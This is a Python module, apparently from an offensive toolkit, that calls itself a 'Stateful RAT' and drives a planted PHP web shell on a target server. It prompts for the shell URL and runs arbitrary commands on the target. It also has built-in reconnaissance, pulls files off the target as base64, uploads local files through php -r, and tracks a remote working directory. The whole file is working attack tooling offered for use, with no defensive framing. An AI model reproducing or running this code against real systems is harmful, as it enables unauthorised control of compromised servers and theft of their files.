"""PHP2Shell Core Engine V3 (Stateful RAT)."""
import os
import base64
import re
from network.client import HTTPClient


def _clean_output(text):
    """Clean polyglot garbage (Magic Bytes & Signature)."""
    if not text: return ""
    # Remove signature
    text = text.replace("TanPha-V3-Active", "")
    # Remove non-printable characters (Magic Bytes)
    text = "".join(c for c in text if c.isprintable() or c in "\n\r\t")
    return text.strip()


def run_php2shell_module(client: HTTPClient):
    print("-" * 60)
    print(" [ Module: PHP2Shell Enterprise Core & Stateful Command Engine ]")
    print("-" * 60)
    
    shell_url = input("[?] Enter active Web Shell URL (e.g., http://target.com/uploads/shell.php): ").strip()
    password_param = input("[?] Execution POST parameter (default: cmd): ").strip() or "cmd"

    # 1. Initialize directory using Marker to bypass garbage output
    current_dir = "/"
    try:
        init_payload = "echo '===INIT_START==='; pwd; echo '===INIT_END==='"
        init_res = client.request("POST", shell_url, data={password_param: init_payload}, bypass_mutation=True)
        
        if init_res.success and init_res.response:
            raw = init_res.response.text
            if '===INIT_START===' in raw and '===INIT_END===' in raw:
                # Extract actual path
                path_raw = raw.split('===INIT_START===')[1].split('===INIT_END===')[0]
                current_dir = _clean_output(path_raw).strip().split('\n')[-1]
            else:
                current_dir = "/app"
    except Exception:
        current_dir = "/app"

    print(f"\n[+] PHP2Shell Session Locked onto Target!")
    print(f"[*] Current Directory: {current_dir}")
    print(f"[*] Type commands, use 'cd <path>', or built-in: [sysinfo, upload <local>, download <remote>, exit]\n")

    while True:
        try:
            prompt_path = current_dir if current_dir else "shell"
            command = input(f"TanPha-RAT:{prompt_path}# ").strip()
            if not command: continue
            
            lower_cmd = command.lower()

            # ==========================================
            # BUILT-IN COMMANDS
            # ==========================================
            if lower_cmd == 'exit':
                print("[*] Exiting PHP2Shell session.")
                break

            if lower_cmd == 'sysinfo':
                sys_payload = "uname -a; id; whoami; hostname; ifconfig || ip a"
                res = client.request("POST", shell_url, data={password_param: sys_payload}, bypass_mutation=True)
                if res.success and res.response:
                    print("\n--- Target System Information ---")
                    print(_clean_output(res.response.text))
                    print("-" * 35 + "\n")
                continue

            if lower_cmd.startswith('download '):
                r_file = command.split(' ', 1)[1].strip()
                print(f"[*] Downloading file: {r_file}...")
                dl_payload = f"base64 {r_file}" if os.name != 'nt' else f"certutil -encode {r_file} stdout"
                res = client.request("POST", shell_url, data={password_param: dl_payload}, bypass_mutation=True)
                
                if res.success and res.response and len(res.response.text.strip()) > 0:
                    local_out = os.path.basename(r_file)
                    try:
                        raw_b64 = _clean_output(res.response.text)
                        # Only take lines that are purely base64 characters
                        clean_b64 = "".join([line for line in raw_b64.split("\n") if re.match(r'^[A-Za-z0-9+/=]+$', line)])
                        decoded_data = base64.b64decode(clean_b64)
                        with open(local_out, "wb") as f_out: 
                            f_out.write(decoded_data)
                        print(f"[+] Download successful! Saved locally as: {local_out}\n")
                    except Exception as e:
                        print(f"[-] Failed to decode downloaded file: {e}\n")
                else:
                    print("[-] Failed to retrieve file or file not found on target.\n")
                continue

            if lower_cmd.startswith('upload '):
                parts = command.split(' ', 1)
                if len(parts) < 2:
                    print("[-] Invalid format! Use: upload <local_file>\n")
                    continue
                l_file = parts[1].strip()
                if not os.path.exists(l_file):
                    print(f"[-] Local file '{l_file}' not found!\n")
                    continue

                print(f"[*] Uploading local file '{l_file}' to target server...")
                try:
                    with open(l_file, "rb") as f_in:
                        b64_data = base64.b64encode(f_in.read()).decode('utf-8')
                    upl_payload = f"php -r \"file_put_contents('{l_file}', base64_decode('{b64_data}'));\""
                    res = client.request("POST", shell_url, data={password_param: upl_payload}, bypass_mutation=True)
                    print(f"[+] Upload process complete! Check target directory.\n")
                except Exception as e:
                    print(f"[-] Failed to upload file: {e}\n")
                continue

            if lower_cmd.startswith('cd '):
                target_folder = command.split(' ', 1)[1].strip()
                # Use ';' instead of '&&' so if current_dir is invalid, pwd still runs
                stateful_cmd = f"cd {current_dir} 2>/dev/null; cd {target_folder} && pwd"
                res = client.request("POST", shell_url, data={password_param: stateful_cmd}, bypass_mutation=True)
                
                if res.success and res.response:
                    clean_out = _clean_output(res.response.text)
                    new_path = clean_out.split("\n")[-1].strip()
                    if new_path.startswith('/') or new_path.startswith('\\'):
                        current_dir = new_path
                        print(f"[+] Changed directory to: {current_dir}\n")
                    else:
                        print(f"[-] Failed to change directory (Not found or access denied).\n")
                continue

            # ==========================================
            # STANDARD COMMAND EXECUTION (Robust Marker)
            # ==========================================
            marker_start = "===TP_START==="
            marker_end = "===TP_END==="
            # Use ';' to cd, so even if it errors, the marker still prints
            wrapped_command = f"cd {current_dir} 2>/dev/null; echo '{marker_start}'; ({command}) 2>&1; echo '{marker_end}'"

            response = client.request("POST", shell_url, data={password_param: wrapped_command}, bypass_mutation=True)
            
            if response.success and response.response:
                raw_output = response.response.text
                
                if marker_start in raw_output and marker_end in raw_output:
                    sanitized = raw_output.split(marker_start)[1].split(marker_end)[0]
                    sanitized = _clean_output(sanitized)
                else:
                    sanitized = _clean_output(raw_output)

                print("\n--- Execution Output ---")
                print(sanitized if sanitized else "[*] Command executed without text output.")
                print("-----------------------\n")

        except KeyboardInterrupt:
            print("\n[*] Session terminated by user.")
            break
        except Exception as e:
            print(f"[-] Connection to web shell failed or lost: {e}")

    input("\nPress Enter to return to main menu...")
